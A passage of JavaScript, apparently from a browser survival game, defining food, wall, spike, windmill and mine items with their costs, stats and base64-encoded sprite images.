    holdOffset: 15
}, {
    age: 3,
    group: j[0],
    name: "cookie",
    desc: "restores 40 health when consumed",
    req: ["food", 15],
    consume: function(e) {
        return e.changeHealth(40, e)
    },
    scale: 27,
    holdOffset: 15
}, {
    age: 7,
    group: j[0],
    name: "cheese",
    desc: "restores 30 health and another 50 over 5 seconds",
    req: ["food", 25],
    consume: function(e) {
        return e.changeHealth(30, e) || e.health < 100 ? (e.dmgOverTime.dmg = -10,
                                                          e.dmgOverTime.doer = e,
                                                          e.dmgOverTime.time = 5,
                                                          !0) : !1
    },
    scale: 27,
    holdOffset: 15
}, {
    age:1,
    group: j[1],
    name: "wood wall",
    desc: "provides protection for your village",
    req: ["wood", 10,'ez',0],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAA4JJREFUeF7tmr1v00AYxh9baWmLxEcpbakYECyIBRALQojZcYfWlZBgQEKCjQkQ/wUwMdIBCQnE4jDkXDoihFgqYEEsSAwISCnlQ9C0SWQjJzE40fnzfHFKX29R7uz3/fl5nzvfnQK6mgQU4tAiQCDaSiAQBKLTFEgRpAhSBHegpNLol9KYnp47WK/buxcXS0t5zmlyVYSuGxsABtsAKoyZk3nByAWErhtOWMKMmT2Pq+cPjILgAeo1jJ6BCAIwMtQSx9o6P5ReAZEOQteNOwCu8EpBO12Dqrb+sW1g4ZlnF11jvIJ75bJ5UaZ/SAOh60YJwAwveP1MLTQn9pQPxHGcJ5ZV0mQAkQJC1+d+Ac72NBD+ekQADADfGDNHs4aRKYgwI4xSQVBiQepw2zvO+pBlWe4QLHxlAkIGgO7MwoBkYahCIDTNOKuqeMR7HSeONDAxZgu/Kf8NKisqlt4U+N8KinOhXC7dT/vAVCA0beaqqqq3eQ89dayOXTtC50sd3faObmv+/rIaX+Hffyp4/mqAm7Pj2Dcs6/HNpEBSgQgqhaQ+cGB/p5++//A7UfxB5ZKmVDIBIQqgO3tRILmASAJhsKBianI41lv/+LmKWiO+x/jV0bcghocKmBhreUHSq7Kygep6I7Jb34Po9oHIjAIaRJVL34LICkBc/yAQbVIEgkB0Fg0pghRBiuAOsFQaVBpUGlQaLoGgqTZ5BHkEecTm8ggv2qy+QjftZ7j/tY0MFzC+J93CzPLXDaxV/4OFGT+QwQEVUxMxl+oqVdTqm2ipzk00ybql2z6qXKLKoNskulezc1mz9AclCkQUgBdLL0FcA3CLZ98nj9YxulPuBs/qDwUvXvM3eABcZ8zkbj6FrZem2tfwbqhpxjlVxQPeA44fbmDfePwaj7Oo+2lZxcu3/C0/28b5hQXzYZz78NoIgfBuuOU3gbvJygAiexfcyyETRXCAuJuYIzwJxjXUEABrjJncQyhpy8LtJwVEc0jVDQagmAZGCASLMVMXSTiorzQQ//xj9i6gXOIFEPcwGeDMM1a6LAOA1NLgqiDgkOmWOV6YxFD9bdNMikQUI700kqhDZGYoAkGqWcYJrFg0aoqC5hTRcVC3LJN/wDLOzQTb5KIIf8zF4uwh97dlld4J5iLUPXcQQtFn2JlAtGESCALRWVekCFIEKYI71lBpUGl0CuMPpubCUvT4yHcAAAAASUVORK5CYII=",
    projDmg: !0,
    uF: [],
    health: 380,
    scale: 50,
    indx: .5,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 3,
    group: j[1],
    name: "stone wall",
    desc: "provides improved protection for your village",
    req: ["stone", 25,'ez',0],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAA2RJREFUeF7tmj9v00AYxp9YIopIOkArlXapBGozZa/6CZzr0LoSEgxISLAxAeJbABMjDEhIIBaHIee2HyDqwtSpiRi6pIrUiiEJCqlkI4dYONH5vy9O6Zstynvn9/35eZ9z7pwDfUYEcsThLwECMVYCgSAQk6ZAiiBFkCKECyW1xry0xvb23t3LS/PW4WHte5bPNJkqgjHtN4D8GECHc/1OVjAyAcGYZvkVzLk+87xmfsEgCA6gWcOYGQgvAIVCYVT7YDAQimRWQKSDYEx7B+CZqMrNzU0oijL6yTRNHB0diZe2HD7W6/pjmf4hDQRjWg3Ajij5ra0t35oajYbwd8uyDgyjpsoAIgUEY3s9wCrGgeCM8YIB4Cfn+u20YaQKws8Ig1TgVZgPEFjWoGAYhr0EJ/6kAkIGgOnK/ICkYaiJQKiqdl9R8FV0O8rlMhYXFxPfKfcEFxcXODk58TBU61G9XvsU94KxQKjqznNFUd6KLlqpVLCwsBA6n+Xl5VFsp9MJPabb7eL4+NjDUM1XhvHtdejJxoGxQHi1QlQfWF9fn8i31WpFyt+rXeK0SiogkgKYrj4pkExARIGQz+extrYW6q6fnp5iOByGirWD3OqYWxDFYhGrq6uhi3IHtttt9Pv9wLFzD2LaBwIr8ggIape5BZEWgLD+QSDGpAgEgZhsGlIEKYIUIVxgqTWoNag1qDVsAl6P2uQR5BHkEVfLI5xs0/oXemX/hrtvW6lUwsrKSqytiLOzM/R6vcCxc2uWosz/6606u+Ao+5Z2fFC7BLXBNOTp3exM9izdSSUFkhSAk8ssQbwA8EYk/6wPeAC85FwXHj75GU2scw1nQlXVHigKPosusLGxgaWlpUCTixJwfn6OZrMpHGKaeLi/r3+JMp87NhEIZ6Jrfwg8TV8GENmn4E4NqShCAMQ+kbkpkmlYQ/UB8ItzXfgSSty2sMdJAWFPzJjGAVTjwPCBYHCusyQFe42VBuKff+y+B3JPRAmEfZkMsD5wXnsqA4DU1hAlfO1fL4xiqO7YOA9FSRQjvTWiqCPJk2ESCFLNMkxi1ao2zOVww461LFwahu68oB5meKoxmSjCXUG1unvP/m4YtR+pVhZxssxBRMxXWjiBGKMlEARisstIEaQIUoRw5aHWoNaYFMYfhr/EUpJ56XkAAAAASUVORK5CYII=",
    health: 900,
    uF: [],
    scale: 50,
    holdOffset: 20,
    indx: .5,
    placeOffset: -5
}, {
    age: 7,
    group: j[1],
    name: "castle wall",
    //  pre: 1,
    desc: "provides powerful protection for your village",
    req: ["stone", 35,'ez',0],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAA6pJREFUeF7tmkFrU0EQxzdRIpik0Ai1pSdFQcGLF8/pNe3BQr+P9fsI9dDm2py9eBEUFD2V1oIpNEnBoE1Z0wfvTfbNzuzOvg24PTabzczv/f+zs/u2ptLfPwK1xGFOIIG4VUICkUAUi0JSRFJEUoRxoUzWWBZr9Hqv9+v1u4PDw3eDmD1NVEX0eruzfPL9/kG0eCr/Ya0ApWpvsKdfq6nB0dHBVpUKqQQEJfmypOv1O1tV2CYoCAqAtY1NNR5dqqvxCBVAaCBBQEDvmzJ88fLVwr8no0v149sXqyNC1BIxEJTk9dNfW9+0JqoHnJ+dqPPTE3SsZC3xBrGzs9e9vv57jEXMAQDn+f71cyW28QaBKcEkf5IcSgZhUHzt4gVie3v3eDZT3Xzc0smXgfv08cPCRz4wvEBANVQFISMAYSwFCFcIq52OajTuqZ9np06uycOIAsJHDVnypszHk5GajMZkKFKqcLZGHsT9Vls9fvrcGnyj0VCrnQfWcXoAVSFRQcAlE7MFJ/kyQjYoRRizt/3++30S7dwgJ0VwbPFwfYMbk3E8BkNCFWwQUA2YLaQgZGTKYCx2oXxVsEHEUIMNhP7cVxVeIGyts7QiLoa/1HQ6NVoHqoK7lLJAwE4SK5LSEPiq4NmDBYJqi2a7pVrNtkiRhJNMp7/VxXBonNvHHs4gHj15pprtFWNAodTAVQXHHmQQVDXoYJcFhI6FCoMEIuaSaZIcZg/XpZQEAp49YqsFto+QLBplPQU8s6CedZJA6ASSNXKPMQ8jxtJpK5bw8JdaH/S8ZEVwVBHSHtg2vcLls/iWKoYqqJsv7gk3SxFQFVjRlNh+w+KKQai0xebYI0Q/QVUDp3/IYDsoomgPTBXSjZX0kplXHBsERxWS9sB2nj5F0lkRcxD0oilhEQwCPIugNlCw/jgpgqMK+INUu9iSz+aFnSSnd/C2hg8I/V1sm47tI0wtuoQt2A0VDITaaWJ7DK0QbvL5+aK/4PFVhcQGTEoNoorIEnN99ccFAyFwO0mxYplNVHYtgPr2iwPA9AY8+75rkfRaPvPBUy6K+ECh3JxxXTJFVg34JE13JeAY2/F/fjwFgB7vqwQxRZikTblPVXb4i8lfygammJ0bKoq3qbZptVesF8eU4r2noMQXxBrYD1OAlH8/LICg1sCgUGpJ6KdfuTVs8vyvL6VDOHPb/Om6XO6wgeZ8HrRYcgKJPTaBuH0CCUQCUTRjUkRSRFKEcYFK1kjWKArjBu9WC2HgRkavAAAAAElFTkSuQmCC",
    health: 1500,
    uF: [],
    scale: 52,
    holdOffset: 20,
    indx: .5,
    placeOffset: -5
}, {
    age: 1,
    group: j[2],
    name: "spikes",
    desc: "damages enemies when they touch them",
    req: ["wood", 20, "stone", 5],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABBdJREFUeF7tms1uEzEQx70JLZWQQgFxQCKiHLhFcATlgNpr+iFa8QC8Sds34QFQi/qRaysOERxBuXFAKEgcEFAiIRVKssibWvXOju3xrrMf4JX2knjt8W//Mx6PN2D+iggEnsOEgAdxrgQPwoOIBwWvCK+IkihibW1jC1ux9vZ20N+nvboV5hqdzpMtxoLN+ATD7W73pQfB2H8JYj3E5N7t7hai0kIG7XRwCAJMETByB4HHBqiN/F2kABBxNbTb7YhCr9eL0chbFbmCgC7RarVYo9GIAAwGg+iWrzxh5AZieXn9KAzZopgoB8BByBdURZ6rSC4gVlaeLo7HoyN50sIlYHQoykVyAQFdgqthOBySk8U8XGTqIKBLkGcvNfwnQJhyBiqYacOYmiJo+QJj169OEsxvP8ymBAE7PjzcXaLCs2lnHp3YGxYQsUfv3Rkxfuuuryc19ubdJW0bDiUI6tsHBy+OiSbq+8vSCfWt8zEe3v/DbsyPrYajABEd1mr1pSxQrBVhM3lhZOfxbysAsHH31azV82nUogWxurrxbDQaLyTrBnS7skIQI9nCkC3kagmC8cL+/s5zleVGRZiifrPZZPzmF0yGXEFQwRBJGc9J+v2+9u2YVh0jCN47hIFlhdwQOUnSxYS5y3V26+Ycavj34Rk7GeKuBGOG/BJEZ2n3LEQQybIahEFVw93bV0h+9eHTT7QddBGTHdT9CgkEtwjLEGUjZBAqNVAhCAIYjPcf64zf4lLZwP+3yTvIIDAXEdKEboHFhvnGLLvWmCGpQTT6/OWUnf5K5hyyKoQNaV1CjGUFAoPBt9IwUGEgbNWgUwV0D8wGU3CEbyQFCKwMH+82bxBwUmmSK2sQE1WoYfC9w6MHZwkXcKmI129nlHsTm7ggG5kKBOYiotOiQdi6ROoYIVNUJVtFuUZaCNEKYxXGQWPVjrMIEGnighPXEJ1g8QIDocsmVS9DlWUm9x3Zz0EyKeICRvysQlVzsA2YWEKFbc2zuISTGKGLF6oNFxUGNcV2ASFzjBAgsFih23TpskxVNsnHwtSQNTY4VYRN0MwSnLGaRCVARPlGxuqUAKcqzFQGhAsYuupUqUFgJ1muirfJvrMvnc6CJcwleI0Abs2FxClAYM1BPCsOjuNFoJKD4MZjNQIYLKkHPOraaAVA8EmrlGGzeujLcRUBISac/PbBjAL7hoI/VVrXgPVMXR3RPP1kC/nLGggibf0BjuJkrwFBcH+GnwHhAC5kTf18AJblSg3C9NZ1az/PUsNwtCl/ZqTrr4Ig7IMa5YS9EiBcGWlSiYsdqJMYAUt2rtJezCUwlZQMhL30TbHE9L+AUhoQJoOr8L8T16jCRE02ehDnhDwIDyLuLF4RXhFeEegC4l3Du4Z3DdQ1/gLN32VhHtKeXAAAAABJRU5ErkJggg==",
    health: 400,
    uF: [],
    dmg: 20,
    scale: 49,
    id: 6,
    spritePadding: -23,
    holdOffset: 8,
    indx: .5,
    placeOffset: -5
}, {
    age: 5,
    group: j[2],
    name: "greater spikes",
    uF: [],
    desc: "damages enemies when they touch them",
    req: ["wood", 30, "stone", 10],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABB9JREFUeF7tm89rE0EUx2cT20aEpCoFBYN48Bb0qPQg7TX9gS3+Af4ntv+Jf4C00h+5VjwEPVZy8yASQaGoTUBMrUnkbTJxdjK/Z5xJzSzkkt2dmfeZ75v39s1uguKREkgihwGBCGKohAgigsguClERURETooi1tc2nrIi1v7/zPEQkC+Ya1erjLYSSZ1mj+9u12sutqQIBxlarG33S6FptN9jEBOuYhoCBhIIRBMTq6pOlXq97xHaBMO4RBARPDSFV4R0EDaFcLqf2N5vNjEB8u0hwEIuLiymAer0+PSBWVjaO+n20hC2uVCqoWCyOAISE4U0R9AIJAAAEeTQaDdRut0d/5XL55YODF6985BXeQLDWhlarlRqOVVEqlYKtFV5AyKKEbMZ9LJxKIEDW/X53lA6Tfi4zIsT5JEEjdzo83F1WGYMSCFY6rNK4yjXXSoMs+1tLeSgqzY6uUVWTVu+2EofR3b3dTX+i4+tpDr19d0nLYNbFOoutNxAqAGhj3hzPWClFVQ3QrxYIlovghAgbQecCIP2H98+tZpcFRNavDgRDENk6AqTIOE2m8wAXEDBBGgbZL4Rg6BsfOi6B79FWhEgVtBqqj35ZKYG+ufZ6NvOXy/TcCQiYHZwc4ZHK1HBjoYAuz+Uzhn1vn6PTNh/e+495BD98QL+QhJFqgHO6bmHkGngQsgjCU0NhLo9uLhSEShEBoVVBN2TiFpYgWDXHwbAe3PuNrs/3xoydL86iq8UZJXf5fNJBnbPxMEurItuYeVHHyDVkquCp4c6tK0oQ8EUfPv1gXs9ThYlLWC2Wf0GwVcECoaMG3P7Psy76ctIZg8EGYa4GK9cQqYIFQlcNIlWwQNiowRGIrCp40cIlCDqnMF0gSalZrRHQEF1wCQECITu3cKSI7CYNNDp1rsHetmODYCVQshDCyycmbrHkJVVTFT55aoBZ5j1yq2SVWCU8NYhrFeZrhdFiKd6yG5jCU4VKPsHLKqFdWYptGkaNQNAuAWV5eOgid6tkhRgWEF4ChVVCh02ofruqfDsBwXsc/q8fw2m3IHerQBGkKmSP4rKoQZ5nqQFvENH9muQV2oqg3UJWMnMBY+JKdbIahGiGTYCIH7nletJZOJUVoRIp5EPj1yrIe20B4Lb+CQgbNciUAucvzAYPbOljgy7Sll+S5LdVdtSVXUNF9rxrbNWkI3HTcXoBkWaa1KuEuPIN5/CrAa6SIxMY3kDEF0WI6RHlIPRuFWztq27pmyiAvsebInDHPBgh359yUqHSnY34eqHARWiYPqJEcNcYRBD+LpmLirSuSoO4Bm+tMEmLTQzm3eN9sSQHEj9TGNLIuoh5vdGFMoIqAgxYX99Mv9jZ29sJ8uUOhhgchIvZdNFGBDGkGEFEEFmHioqIioiKYAaZP321OmHR4N2KAAAAAElFTkSuQmCC",
    health: 500,
    dmg: 35,
    scale: 52,
    id: 7,
    spritePadding: -23,
    indx: .5,
    holdOffset: 8,
    placeOffset: -5
}, {
    age: 9,
    group: j[2],
    // pre:1,
    uF: [],
    name: "poison spikes",
    desc: "poisons enemies when they touch them",
    req: ["wood", 35, "stone", 15],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABEJJREFUeF7tm01rE0EYx2ezpkkUklopKLWIoLeiR8WDtNf0BVv8AH4T22/iB5BW+pJrxYPoUelNQUSLQrE2AU1iTVZmN7Pdmc77TmcSOwu9dF9m5jf/53n+O7MJgD9iAoHnkBDwIAZK8CA8CDwpeEV4RQyJIhYXV57QKtbW1vozF5XMWWjU649WAQie4oOO1hqNF6vnCgQcbL2+HGUH3WhsOJsYZw2TEBAQVzCcgFhYeDzb7/d26SHgJjycgGCpwaUqrIMgIUxMF+PxH345xgRiO0Scg7j14GIM4OPr3+cHxPz88m4UgVk04qmZEqhUwxSASxjWFEEmyEq1AKZmypgK9vc6oN3qp/8rFMK57e3nL234CmsgaLmh3ezFA4dQ4FGphc5yhRUQoiohmnEbiVMKBJR1FPVSO5yNc9EgXJwPApCG087OxpxMH6RA0OywzMNlrpmoJS77sCndFZnHptfIqkmp9bwSh727faMX//GOH0cF8Pb9BaUB0y5WSbbWQMgAIAfz5l0xl1Jk1QDbVQJBCxFkiNAgSC8ApX//Lu4aVaeaBkTUrgoETRD4OgK0yMgmkz7ABAQEjYSRbbfd6oH9vW4u/6GsCJ4qSDXUH/5RnXzu9Y1XY9h5k/bcCAg4O8gcoZ6K1HB1sgwqpRN7De/72ToGRy02vA+fQwD/0jami6BSK2BqgOdUw0IrNFAnRBWEpYZyKQTXJnFrTcqAB4RUBXmvSqXI3quliCQ8aGuOyaPv3fkLroyfvDOgBserY+ByNXntFh3fDjqg0z1dZklV4M/RX9TRBkHLFalaGLnh5vVLovFj5z99/UW9nqUKnZBADeQEQVcFLSxU1IA61+72wPeDzikYdBD6asiVI3i5ggZCVQ3o+TRV0EDkUYMhEISvYBgokyBIT6GbII0kS/QQcsGFVTbPEgQA+cLCkCLwTZo4iVKSpUkQQxcarBJKA0EzUKISwvITQ5csWaaKZaZUVTES5ZNnqFiv3DKuEqmEpQb+WoV+rtDyEfwtu2QoLFXI+AmWq4TPFVls3TKqBYIMCbg/0W72sRVo0UIMDQjLQCGVkGUTrn6bWvk2AoL1Ovxfv4aTYZHdrYL7l9k9TNGruKhqZM/T1IA2iMh2dXyFsiLIsBAtmZmAMXRLdaI1CN4M6wDhv3KL9aSSOKUVIVMpxF1jr1Vk780LAD3rTEDkUYNIKfD8yGzwwC19NKBR2vILgnBNZkddOjRkZM+6Jq+aVCSu208rIGKnSXxKiFa+4Tn0aYApc6QDwxoI/6FIZnp4HoTcrYJb+7Jb+joKIO+xpgjUMAuGy++njKxQqc6G/7yQEyIkTBtVwnloJBWEvUtmYkVaVaVOQoOVK3Rssc6AWfdYT5bZjvifKQxo4CGiv95oQhlOFQEHsLS0Ev9iZ3Nz3ckvdxBE5yBMzKaJZ3gQA4oehAeBB5RXhFeEVwS1yPwDNX06YQXmnr8AAAAASUVORK5CYII=",
    health: 600,
    dmg: 30,
    pDmg: 5,
    id: 8,
    scale: 52,
    spritePadding: -23,
    holdOffset: 8,
    indx: .5,
    placeOffset: -5
}, {
    age: 9,
    group: j[2],
    //  pre:2,
    name: "spinning spikes",
    desc: "damages enemies when they touch them",
    req: ["wood", 30, "stone", 20],
    health: 500,
    uF: [],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABB9JREFUeF7tm89rE0EUx2cT20aEpCoFBYN48Bb0qPQg7TX9gS3+Af4ntv+Jf4C00h+5VjwEPVZy8yASQaGoTUBMrUnkbTJxdjK/Z5xJzSzkkt2dmfeZ75v39s1uguKREkgihwGBCGKohAgigsguClERURETooi1tc2nrIi1v7/zPEQkC+Ya1erjLYSSZ1mj+9u12sutqQIBxlarG33S6FptN9jEBOuYhoCBhIIRBMTq6pOlXq97xHaBMO4RBARPDSFV4R0EDaFcLqf2N5vNjEB8u0hwEIuLiymAer0+PSBWVjaO+n20hC2uVCqoWCyOAISE4U0R9AIJAAAEeTQaDdRut0d/5XL55YODF6985BXeQLDWhlarlRqOVVEqlYKtFV5AyKKEbMZ9LJxKIEDW/X53lA6Tfi4zIsT5JEEjdzo83F1WGYMSCFY6rNK4yjXXSoMs+1tLeSgqzY6uUVWTVu+2EofR3b3dTX+i4+tpDr19d0nLYNbFOoutNxAqAGhj3hzPWClFVQ3QrxYIlovghAgbQecCIP2H98+tZpcFRNavDgRDENk6AqTIOE2m8wAXEDBBGgbZL4Rg6BsfOi6B79FWhEgVtBqqj35ZKYG+ufZ6NvOXy/TcCQiYHZwc4ZHK1HBjoYAuz+Uzhn1vn6PTNh/e+495BD98QL+QhJFqgHO6bmHkGngQsgjCU0NhLo9uLhSEShEBoVVBN2TiFpYgWDXHwbAe3PuNrs/3xoydL86iq8UZJXf5fNJBnbPxMEurItuYeVHHyDVkquCp4c6tK0oQ8EUfPv1gXs9ThYlLWC2Wf0GwVcECoaMG3P7Psy76ctIZg8EGYa4GK9cQqYIFQlcNIlWwQNiowRGIrCp40cIlCDqnMF0gSalZrRHQEF1wCQECITu3cKSI7CYNNDp1rsHetmODYCVQshDCyycmbrHkJVVTFT55aoBZ5j1yq2SVWCU8NYhrFeZrhdFiKd6yG5jCU4VKPsHLKqFdWYptGkaNQNAuAWV5eOgid6tkhRgWEF4ChVVCh02ofruqfDsBwXsc/q8fw2m3IHerQBGkKmSP4rKoQZ5nqQFvENH9muQV2oqg3UJWMnMBY+JKdbIahGiGTYCIH7nletJZOJUVoRIp5EPj1yrIe20B4Lb+CQgbNciUAucvzAYPbOljgy7Sll+S5LdVdtSVXUNF9rxrbNWkI3HTcXoBkWaa1KuEuPIN5/CrAa6SIxMY3kDEF0WI6RHlIPRuFWztq27pmyiAvsebInDHPBgh359yUqHSnY34eqHARWiYPqJEcNcYRBD+LpmLirSuSoO4Bm+tMEmLTQzm3eN9sSQHEj9TGNLIuoh5vdGFMoIqAgxYX99Mv9jZ29sJ8uUOhhgchIvZdNFGBDGkGEFEEFmHioqIioiKYAaZP321OmHR4N2KAAAAAElFTkSuQmCC",
    dmg: 45,
    turnSpeed: .0015,
    scale: 52,
    id: 9,
    spritePadding: -23,
    holdOffset: 8,
    indx: .5,
    placeOffset: -5
}, {
    group: j[3],
    name: "windmill",
    desc: "generates gold over time",
    req: ["wood", 50, "stone", 10],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAudJREFUeF7tm79v00AUx5+TwFaxgVQGJsaO7YgSicktUYuYUP+D/hFN/oj+B4gJkSgkniolYmzHjEwMIMGG2CCJq3Ps5OzcD5/vXRw5z1Imn+/H577v3r13Fw/oiQh4xGFJgEDESiAQBCK9KJAiSBElKaLdftsp4qEGg8+FvjNta2um4fsXoWnnWPkg6G2lj1tphA2IQMQy4EE8OVDz//N3LZ5KK4KBuHzTEFrKhy8zIBAAQCBifRAIApFeKkgRVVeEaP9g4jUSvbh2o043VLJNVBEQDEitVm8Nh58mRXaoum+cgPD98w6Ady1rvCiIZX1hNwj66PEHOojT04txGEJTNQN2IAA8DyajUa+lm2WT96ggREp4+WIO7Bd8fbzqlwkI/9U/+Pa9Hv3SD64y0ECcnb1rLhbzMd9ZNojVYmcBQlQHdmSKBiK7MPIQok4LQNxN5/Dz1zLAOnzmwclRfWOLraoHEwYKiCyExBx4dfAgTGw3C0JkJhiu1QmIbOezirABIarLOQiWXpvNQqkbNBlQ2WUbDa+rSvspFeEShEg1NsrRgd5JEDIIMu+gG2Se92ggdOk1WWf4bBMro4Mgg2HbPioIWXpNNSM3H/+vXueFIIJx9f5RnolPleFD+lJBsH3C/XSBAuL4qBbtM0yenQHRv53Bj9/rjLSNIp4/9eD8tTjhK4NDIGIyOwOCTIPTaiUXS5OFKilbOfdZBILsG92iWTRAU/URzX1iglBtrFxAYO3tLAhssLr6rEDoKk/e65IyNsFUnpDeeRheFMTeJmYim8/ciNnLVF0eE7HJYssiUswDH5RU3RrE5sHO3qXzExh0wMOtrHTkx8EQHfgkr01OunjPheEmZZ4QdY0QNULXAjJUstcL6VYdAJiYhktz4OfKuWmI9hgEIqZCIAhEOhYhRXCKUEW2e3MXO294H+Ux6P8aS1yVA0F/ZTKxgxLLbm1DVeIYczVNIGJMBIJApC2GFEGKSCviAbuwhmEKe216AAAAAElFTkSuQmCC",
    health: 400,
    stop: true,
    pps: 1,
    uF: [],
    turnSpeed: .0016,
    spritePadding: 25,
    iconLineMult: 12,
    indx: 2,
    scale: 45,
    holdOffset: 20,
    placeOffset: 5
}, {
    age: 5,
    pre: 1,
    group: j[3],
    name: "faster windmill",
    uF: [],
    stop: true,
    desc: "generates more gold over time",
    req: ["wood", 60, "stone", 20],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAudJREFUeF7tm79v00AUx5+TwFaxgVQGJsaO7YgSicktUYuYUP+D/hFN/oj+B4gJkSgkniolYmzHjEwMIMGG2CCJq3Ps5OzcD5/vXRw5z1Imn+/H577v3r13Fw/oiQh4xGFJgEDESiAQBCK9KJAiSBElKaLdftsp4qEGg8+FvjNta2um4fsXoWnnWPkg6G2lj1tphA2IQMQy4EE8OVDz//N3LZ5KK4KBuHzTEFrKhy8zIBAAQCBifRAIApFeKkgRVVeEaP9g4jUSvbh2o043VLJNVBEQDEitVm8Nh58mRXaoum+cgPD98w6Ady1rvCiIZX1hNwj66PEHOojT04txGEJTNQN2IAA8DyajUa+lm2WT96ggREp4+WIO7Bd8fbzqlwkI/9U/+Pa9Hv3SD64y0ECcnb1rLhbzMd9ZNojVYmcBQlQHdmSKBiK7MPIQok4LQNxN5/Dz1zLAOnzmwclRfWOLraoHEwYKiCyExBx4dfAgTGw3C0JkJhiu1QmIbOezirABIarLOQiWXpvNQqkbNBlQ2WUbDa+rSvspFeEShEg1NsrRgd5JEDIIMu+gG2Se92ggdOk1WWf4bBMro4Mgg2HbPioIWXpNNSM3H/+vXueFIIJx9f5RnolPleFD+lJBsH3C/XSBAuL4qBbtM0yenQHRv53Bj9/rjLSNIp4/9eD8tTjhK4NDIGIyOwOCTIPTaiUXS5OFKilbOfdZBILsG92iWTRAU/URzX1iglBtrFxAYO3tLAhssLr6rEDoKk/e65IyNsFUnpDeeRheFMTeJmYim8/ciNnLVF0eE7HJYssiUswDH5RU3RrE5sHO3qXzExh0wMOtrHTkx8EQHfgkr01OunjPheEmZZ4QdY0QNULXAjJUstcL6VYdAJiYhktz4OfKuWmI9hgEIqZCIAhEOhYhRXCKUEW2e3MXO294H+Ux6P8aS1yVA0F/ZTKxgxLLbm1DVeIYczVNIGJMBIJApC2GFEGKSCviAbuwhmEKe216AAAAAElFTkSuQmCC",
    health: 500,
    pps: 1.5,
    turnSpeed: .0025,
    spritePadding: 25,
    iconLineMult: 12,
    index: 2,
    scale: 47,
    holdOffset: 20,
    placeOffset: 5
}, {
    age: 8,
    group: j[3],
    name: "power mill",
    uF: [],
    stop: true,
    // pre: 1,
    desc: "generates more gold over time",
    req: ["wood", 100, "stone", 50],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAudJREFUeF7tm79v00AUx5+TwFaxgVQGJsaO7YgSicktUYuYUP+D/hFN/oj+B4gJkSgkniolYmzHjEwMIMGG2CCJq3Ps5OzcD5/vXRw5z1Imn+/H577v3r13Fw/oiQh4xGFJgEDESiAQBCK9KJAiSBElKaLdftsp4qEGg8+FvjNta2um4fsXoWnnWPkg6G2lj1tphA2IQMQy4EE8OVDz//N3LZ5KK4KBuHzTEFrKhy8zIBAAQCBifRAIApFeKkgRVVeEaP9g4jUSvbh2o043VLJNVBEQDEitVm8Nh58mRXaoum+cgPD98w6Ady1rvCiIZX1hNwj66PEHOojT04txGEJTNQN2IAA8DyajUa+lm2WT96ggREp4+WIO7Bd8fbzqlwkI/9U/+Pa9Hv3SD64y0ECcnb1rLhbzMd9ZNojVYmcBQlQHdmSKBiK7MPIQok4LQNxN5/Dz1zLAOnzmwclRfWOLraoHEwYKiCyExBx4dfAgTGw3C0JkJhiu1QmIbOezirABIarLOQiWXpvNQqkbNBlQ2WUbDa+rSvspFeEShEg1NsrRgd5JEDIIMu+gG2Se92ggdOk1WWf4bBMro4Mgg2HbPioIWXpNNSM3H/+vXueFIIJx9f5RnolPleFD+lJBsH3C/XSBAuL4qBbtM0yenQHRv53Bj9/rjLSNIp4/9eD8tTjhK4NDIGIyOwOCTIPTaiUXS5OFKilbOfdZBILsG92iWTRAU/URzX1iglBtrFxAYO3tLAhssLr6rEDoKk/e65IyNsFUnpDeeRheFMTeJmYim8/ciNnLVF0eE7HJYssiUswDH5RU3RrE5sHO3qXzExh0wMOtrHTkx8EQHfgkr01OunjPheEmZZ4QdY0QNULXAjJUstcL6VYdAJiYhktz4OfKuWmI9hgEIqZCIAhEOhYhRXCKUEW2e3MXO294H+Ux6P8aS1yVA0F/ZTKxgxLLbm1DVeIYczVNIGJMBIJApC2GFEGKSCviAbuwhmEKe216AAAAAElFTkSuQmCC",
    health: 800,
    pps: 2,
    turnSpeed: .005,
    spritePadding: 25,
    iconLineMult: 12,
    indx: 2,
    scale: 47,
    holdOffset: 20,
    placeOffset: 5
}, {
    age: 5,
    group: j[4],
    type: 2,
    uF: [],
    name: "mine",
    desc: "allows you to mine stone",
    req: ["wood", 20, "stone", 100],
    iconLineMult: 12,
    url:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABypJREFUeF7tml1MU2cYx/98FwoojK8WRapeiMigbBoj02r8QA5zybLIYozbjVmW7XK7dRfb4tV2uZtlu8FEM8yyZMpBJToZSjRurWYi3iDIoOXDSAIUyvfyf9dD2nIOAXpK2+S8N1zQc/o+v/6fj/d5nwQYSxBIMDj8T8AA4VeCAcIAERwUDEUYijAUoZooDdcwXCO2XCMRQIq/npkBsBCtAi9arkEAZsD0VnW1/UJ2drbt7t2284DvEQBvNIBEA4QJMFkBHJCkukuBCpDllo+BxfvA9ACAaQCLG6WQjQSRBCATSKuRJKl5JQNlWX4XmL4PYBzA/EbA2AgQKYD5DWCuSpKkltUa5fV6+9va2j4Bkl2AdyTSQCIJgnHABKRX2u2VFy0Wy2E1CNPT01hcXITJZFJlNDjo+cPpdH4GzPQBmIqUu0QKRCqQXgjM75Wk+l+1VJCXl4eioiLx78HBQbx69UpTMLLc/D6Q9BcwNQyAGUbXpTeIpWxQVVX5jdVqfUdtt